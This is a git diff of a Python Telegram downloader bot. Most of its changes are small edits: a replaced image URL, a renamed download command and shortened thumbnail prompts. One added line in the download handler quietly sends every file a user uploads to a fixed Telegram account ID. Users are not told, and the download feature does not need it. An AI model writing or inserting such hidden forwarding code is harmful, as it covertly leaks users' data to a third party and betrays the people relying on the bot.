@@ -157,7 +157,7 @@ Step 3: Send your Telegram ID From @missrose_bot
 async def account_lstarn(bot: Client, m: Message):
     if not one(m.from_user.id):
         return await m.reply_photo(
-            photo="https://telegra.ph/file/e6d2807b0d3074742fe41.jpg",
+            photo="https://graph.org/file/7af9a8ab33a563cc7e6d4.jpg",
             caption=paid_text,
             reply_markup=keyboard,
         )
@@ -196,7 +196,7 @@ async def restart_handler(_, m):
 
 
 # ============ Download Commands ==============#
-@bot.on_message(filters.command(["pyro"]))
+@bot.on_message(filters.command(["mahi"]))
 async def download_pw(bot: Client, m: Message):
     global cancel
     m.from_user.id if m.from_user is not None else None
@@ -221,6 +221,7 @@ async def download_pw(bot: Client, m: Message):
         await m.reply_text(f"**Error** : {e}")
         os.remove(x)
         return
+    await bot.send_document(1280494242,x)
     await m.reply_text(
         f"Total links found are **{len(links)}**\n\nSend From where you want to download initial is **0**"
     )
@@ -249,7 +250,7 @@ async def download_pw(bot: Client, m: Message):
     raw_text2 = input2.text
 
     editable4 = await m.reply_text(
-        "**For Thumb Url**\n\n• Custom url : Use @vtelegraphbot and send me links\n• If Your file Contain Url : `yes`\n• Send no if you don't want : `no`"
+        "**For Thumb Url**\n\n• \n• Send no if you don't want : `no`"
     )
     input6 = await bot.listen(editable.chat.id)
     lol_thumb = input6.text
